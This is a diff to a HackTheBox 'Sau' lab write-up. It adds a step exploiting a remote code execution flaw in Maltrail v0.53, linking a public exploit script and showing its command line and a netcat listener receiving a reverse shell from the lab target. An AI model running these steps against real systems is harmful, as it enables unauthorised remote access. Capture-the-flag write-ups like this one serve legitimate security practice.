@@ -131,9 +131,18 @@ Notes:
 
 ![Maltrail](https://github.com/timmccann222/Public-Writeups-Library/blob/main/HackTheBox/Linux%20Machines/Sau/Images/Maltrail%20Application.png)
 
+* Application has RCE vulnerability which can be exploited using script from [here](https://github.com/spookier/Maltrail-v0.53-Exploit/tree/main).
 
+```bash
+# exploit script
+python3 exploit.py 10.10.14.47 443 http://10.10.11.224:55555/n5wtoms
 
-
+# netcat listening
+nc -lvnp 443 
+listening on [any] 443 ...
+connect to [10.10.14.47] from (UNKNOWN) [10.10.11.224] 42082
+$
+```
 
 
 
